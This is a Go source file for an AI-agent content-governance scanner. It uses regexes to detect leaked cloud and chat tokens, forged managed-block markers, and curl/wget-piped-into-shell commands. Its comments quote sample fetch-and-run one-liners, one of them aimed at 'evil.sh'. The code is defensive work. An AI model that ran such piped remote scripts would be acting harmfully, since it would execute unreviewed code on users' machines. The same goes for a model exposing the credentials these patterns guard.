// Package govern holds orbeat's content governance checks. The Scanner runs in
// TWO runtimes, in two different processes, and the same finding means
// different things in each.
//
// At submit-for-review time (orbeat-api, handleSubmitArtifact in
// admin_artifact_review.ee.go, an Enterprise-only route) a block fails the
// submission outright and warn/info travel to a human approver in the review
// queue.
//
// At runtime call interception (orbeat-gateway, internal/gateway/intercept.go
// via ScanCall, shipped in BOTH editions) the same Scanner inspects live MCP
// tool-call arguments and results with NO human in the loop: a block denies
// the call on the argument side and withholds the upstream's result on the
// result side, while warn and info become gateway.call.flagged audit rows
// nobody is waiting on. A rule written for the review queue is therefore also
// a runtime enforcement rule, so weigh its false positives against both.
//
// The default scanner is rule-based and in-process. An LLM-based scanner
// shipped in v1.12.0 behind this same interface (llm_scanner.ee.go,
// Enterprise-only), composed with the rule scanner by CompositeScanner. It is
// off unless ORBEAT_SCAN_LLM_ENDPOINT is set, advisory only (its severities
// are clamped to warn/info, so it can never block), and wired only in cmd/api,
// which means it never sees an intercepted call.
package govern

import (
	"context"
	"regexp"
)

// Finding is one scanner result. Severity is info | warn | block; a single block
// finding fails submission fail-closed.
type Finding struct {
	Rule     string `json:"rule"`
	Message  string `json:"message"`
	Severity string `json:"severity"`
}

// ArtifactPayload is the scannable surface of an artifact.
type ArtifactPayload struct {
	Type        string
	Name        string
	Content     string
	MemoryScope string
	MemorySeed  string
}

// Scanner inspects an artifact payload for governance findings. The error return
// is for scanners that can fail (e.g. a future network-backed LLM judge); the
// default scanner never returns one.
type Scanner interface {
	Scan(ctx context.Context, p ArtifactPayload) ([]Finding, error)
}

// HasBlocking reports whether any finding blocks submission.
func HasBlocking(fs []Finding) bool {
	for _, f := range fs {
		if f.Severity == "block" {
			return true
		}
	}
	return false
}

// MaxContentBytes and MaxSeedBytes are the hard size ceilings for an
// artifact's content and memory seed. The api layer HARD-REJECTS at these
// exact sizes at create/update time (validateArtifact, admin_artifacts.go)
// with a 400, before an artifact is ever scanned or stored. See
// WarnContentBytes and WarnSeedBytes below for the scanner's own, lower,
// threshold.
const (
	MaxContentBytes = 64 * 1024
	MaxSeedBytes    = 16 * 1024
)

// WarnContentBytes and WarnSeedBytes are the scanner's "approaching the
// limit" thresholds, each 75% of the matching Max*Bytes cap above (48KiB of
// 64KiB, 12KiB of 16KiB). That leaves a full quarter of the ceiling, 16KiB of
// headroom on content and 4KiB on seed, between the moment an author sees
// the warning and the moment the SAME content would 400 at create/update
// time: a warning only earns its keep if there is room left to act on it,
// not a threshold that trips one paragraph before the wall.
//
// The rule used to warn at exactly MaxContentBytes and MaxSeedBytes, the
// size validateArtifact already rejects with a 400. On the only path that
// calls the scanner at submit time, validateArtifact runs first and returns
// before an oversized artifact is ever stored, so the scanner never saw
// content at that size: a warn condition that only trips on values the
// caller in front of it already rejects is dead code wearing a live
// variable name. The one path that kept it reachable was runtime call
// interception (internal/gateway, via ScanCall), which has no hard cap of
// its own, not artifact submission, which is what this threshold exists to
// protect.
const (
	WarnContentBytes = MaxContentBytes * 3 / 4
	WarnSeedBytes    = MaxSeedBytes * 3 / 4
)

var (
	awsKeyRe  = regexp.MustCompile(`\b(?:AKIA|ASIA)[0-9A-Z]{16}\b`)
	gcpKeyRe  = regexp.MustCompile(`\bAIza[0-9A-Za-z\-_]{35}\b`)
	ghTokenRe = regexp.MustCompile(`\bgh[pousr]_[0-9A-Za-z]{36,}\b`)
	slackRe   = regexp.MustCompile(`\bxox[baprs]-[0-9A-Za-z-]{10,}\b`)
	privKeyRe = regexp.MustCompile(`-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----`)
	// reservedMarkerRe matches the orbeat-sync managed-block sentinels (ORBEAT-SEED
	// in subagent MEMORY.md, ORBEAT-RULES in AGENTS.md). Blocking any occurrence
	// prevents an artifact from forging a managed block once delivered, while still
	// allowing prose that only mentions the feature by name.
	reservedMarkerRe = regexp.MustCompile(`<!--\s*ORBEAT-(SEED|RULES):(BEGIN|END)\b`)
	// remoteExecRe matches the family of commands that fetch a remote script
	// and execute it immediately: curl or wget piped into sh, bash or zsh
	// (optionally through sudo, or invoking the shell by an absolute
	// /bin or /usr/bin path), plus the process-substitution spelling of the
	// same idea, e.g. "bash <(curl -s https://example.com/install.sh)". This
	// is the install-script pattern used by countless real installers, and
	// it is exactly the shape this scanner's threat model cares about: an
	// artifact IS instructions an AI agent will execute with shell access,
	// so an instruction that fetches whatever a remote server happens to
	// serve right now, unreviewed and free to change after approval, and
	// runs it, is worth a human reading before it reaches every developer's
	// machine.
	remoteExecRe = regexp.MustCompile(
		`(?i)\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:/(?:usr/)?bin/)?(?:sh|bash|zsh)\b` +
			`|\b(?:sh|bash|zsh)\s+<\(\s*(?:curl|wget)\b`,
	)
)

// NewDefaultScanner returns the built-in rule-based scanner.
func NewDefaultScanner() Scanner { return defaultScanner{} }

type defaultScanner struct{}

func (defaultScanner) Scan(_ context.Context, p ArtifactPayload) ([]Finding, error) {
	var f []Finding
	f = append(f, scanSecrets("content", p.Content)...)
	f = append(f, scanSecrets("seed", p.MemorySeed)...)
	f = append(f, scanReserved("content", p.Content)...)
	f = append(f, scanReserved("seed", p.MemorySeed)...)
	f = append(f, scanRemoteExec("content", p.Content)...)
	f = append(f, scanRemoteExec("seed", p.MemorySeed)...)
	if len(p.Content) > WarnContentBytes {
		f = append(f, Finding{Rule: "size", Severity: "warn", Message: "content is approaching the 64KiB limit"})
	}
	if len(p.MemorySeed) > WarnSeedBytes {
		f = append(f, Finding{Rule: "size", Severity: "warn", Message: "seed is approaching the 16KiB limit"})
	}
	return f, nil
}

func scanSecrets(where, text string) []Finding {
	var f []Finding
	if awsKeyRe.MatchString(text) {
		f = append(f, Finding{Rule: "secret", Severity: "block", Message: "possible AWS access key ID in " + where})
	}
	if gcpKeyRe.MatchString(text) {
		f = append(f, Finding{Rule: "secret", Severity: "block", Message: "possible Google API key in " + where})
	}
	if ghTokenRe.MatchString(text) {
		f = append(f, Finding{Rule: "secret", Severity: "block", Message: "possible GitHub token in " + where})
	}
	if slackRe.MatchString(text) {
		f = append(f, Finding{Rule: "secret", Severity: "block", Message: "possible Slack token in " + where})
	}
	if privKeyRe.MatchString(text) {
		f = append(f, Finding{Rule: "secret", Severity: "block", Message: "private key block in " + where})
	}
	return f
}

// HasReservedMarker reports whether text carries an orbeat-sync managed-block
// sentinel. It is the ONE definition of that set: scanReserved below calls it,
// and so does internal/api's validateArtifact, which refuses the same markers
// with a 400 at create/update time in BOTH editions.
//
// Two callers rather than two copies, deliberately. Audit finding A15 is what
// a second copy costs: validateArtifact carried its own hand-written
// strings.Contains(seed, "ORBEAT-SEED") and knew nothing about ORBEAT-RULES,
// so a rule artifact quoting orbeat's own block format was accepted by the
// only check that runs in the Community edition, where nothing calls Scan at
// all. Adding a third sentinel to reservedMarkerRe now extends the write-time
// reject for free instead of leaving it one marker behind.
//
// The two callers are NOT redundant, and the difference is the point: this
// returns a bare bool for a caller that rejects the WRITE, while scanReserved
// wraps it in a Finding for callers that report findings (the Enterprise
// review queue, and ScanCall's runtime interception in the gateway, which
// never sees an artifactInput and so can never reach validateArtifact).
func HasReservedMarker(text string) bool { return reservedMarkerRe.MatchString(text) }

func scanReserved(where, text string) []Finding {
	if HasReservedMarker(text) {
		return []Finding{{Rule: "reserved-marker", Severity: "block",
			Message: "reserved orbeat managed-block sentinel marker in " + where}}
	}
	return nil
}

// scanRemoteExec is warn, deliberately never block. A skill that legitimately
// documents this exact command, an install guide, a troubleshooting note,
// must remain publishable; this rule is not a judgment that the pattern is
// forbidden, only that a human approver should read it and decide. Block
// authority for artifact content stays with scanSecrets and scanReserved
// above.
//
// False positives are accepted, on purpose. This cannot tell a fenced code
// block in documentation ("here is what NOT to run: `curl evil.sh | bash`")
// from a live instruction telling the agent to run it, and it does not try
// to: the two are byte-for-byte identical to a regex. Since the severity is
// advisory, a documented example costs the approver one dismissed warning
// rather than risking a silent miss on the case that matters.
//
// It also does not try to catch every equivalent shape: a backslash-
// continued multi-line pipe, a download and a separate execute step joined
// by "&&" or ";" instead of a pipe, or a base64-obfuscated payload. Those
// belong to open-ended prompt-injection or malware detection, which this
// rule deliberately is not; it is one clear, narrow pattern family.
func scanRemoteExec(where, text string) []Finding {
	if remoteExecRe.MatchString(text) {
		return []Finding{{Rule: "remote-exec", Severity: "warn",
			Message: "a remote script is piped into a shell in " + where}}
	}
	return nil
}
